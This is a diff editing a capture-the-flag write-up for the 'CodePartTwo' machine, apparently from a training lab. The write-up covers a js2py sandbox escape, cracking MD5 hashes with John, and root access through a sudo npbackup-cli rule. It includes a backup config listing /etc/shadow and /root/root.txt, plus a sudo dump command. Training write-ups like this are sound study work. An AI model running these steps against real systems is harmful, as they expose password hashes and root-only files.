@@ -14,6 +14,8 @@
 
 CodePartTwo is an easy Linux machine hosting a Python web application built with Flask and Gunicorn. The app exposes a JavaScript code editor powered by `js2py` 0.74, which is vulnerable to a sandbox escape (CVE-2024-28397) allowing arbitrary command execution via `subprocess.Popen`. A reverse shell is obtained as `app`. A SQLite database found in the app directory contains MD5-hashed passwords; cracking them yields credentials for `marco`, granting SSH access and the user flag. Privilege escalation is achieved by abusing a `sudo` rule allowing `npbackup-cli` to run as root, which is used to back up and dump `/root/root.txt`.
 
+`CodePartTwo` is an Easy Linux machine that features a vulnerable Flask-based web application. Initial web enumeration reveals a JavaScript code editor powered by a vulnerable version of `js2py`, which allows for remote code execution via sandbox escape. Exploiting this flaw grants access to the system as an unprivileged user. Further enumeration reveals an `SQLite` database containing password hashes, which are cracked to gain SSH access. Finally, a backup utility, `npbackup-cli,` that runs with root privileges, is leveraged to obtain root privileges.
+
 ---
 ## Enumeration
 
@@ -45,9 +47,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds
 ```
 
-### Service Enumeration
-
 Two open ports: SSH on 22 and a Gunicorn web app on 8000.
+### Service Enumeration
 
 ![](./screens/1.png)
 
@@ -139,7 +140,7 @@ The database contains MD5 password hashes for registered users.
 
 ![](./screens/8.png)
 
-Saving marco's hash.
+Saving marco's hash and cracking it through john.
 
 ```
 john --show --format=Raw-MD5 marco.txt
@@ -147,10 +148,8 @@ john --show --format=Raw-MD5 marco.txt
 
 1 password hash cracked, 0 left
 ```
- cracking it with John reverals the password.
  
 ---
-
 ## User Flag
 
 ```
@@ -163,7 +162,6 @@ ssh marco@codepartwo.htb
 ![](./screens/10.png)
 
 ---
-
 ## Privilege Escalation
 
 ### Enumeration
@@ -178,14 +176,14 @@ Marco can run `npbackup-cli` as root. `npbackup` is a backup tool that reads a c
 
 ### Exploitation
 
-Editing `npbackup.conf` to add privileged paths to the backup target:
-
 ```yaml
 paths:
   - /home/app/app/
   - /root/root.txt
   - /etc/shadow
 ```
+
+The `npbackup.conf` configuration file can be edited to add privileged paths to the backup target.
 
 Running the backup as root:
 
@@ -202,19 +200,17 @@ sudo /usr/local/bin/npbackup-cli -c npbackup.conf --snapshot-id 7892c729 --dump 
 6a19f2abb0f8a1554a87516b52215bf7
 ```
 
-Since `npbackup-cli` runs as root, it can back up and restore any file regardless of the invoking user's permissions.
+Since `npbackup-cli` runs as root, it can back up and restore any file regardless of the user's permissions.
 
 ---
-
 ## Remediation
 
-- **CVE-2024-28397:** Upgrade `js2py` to a patched version or replace it with a properly sandboxed JavaScript runtime.
+- **CVE-2024-28397:** Upgrade `js2py` to a patched version.
 - **MD5 password hashing:** Replace MD5 with a modern password hashing algorithm such as bcrypt or Argon2.
-- **sudo npbackup-cli abuse:** Remove the `npbackup-cli` sudo rule or restrict it to specific pre-approved configuration files owned by root.
+- **sudo npbackup-cli abuse:** Remove the `npbackup-cli` sudo rule or restrict it to specific configuration files.
 - **Backup configuration exposure:** Ensure backup config files containing encrypted credentials are not readable by unprivileged users.
 
 ---
-
 ## References
 
 - [CVE-2024-28397 PoC](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)
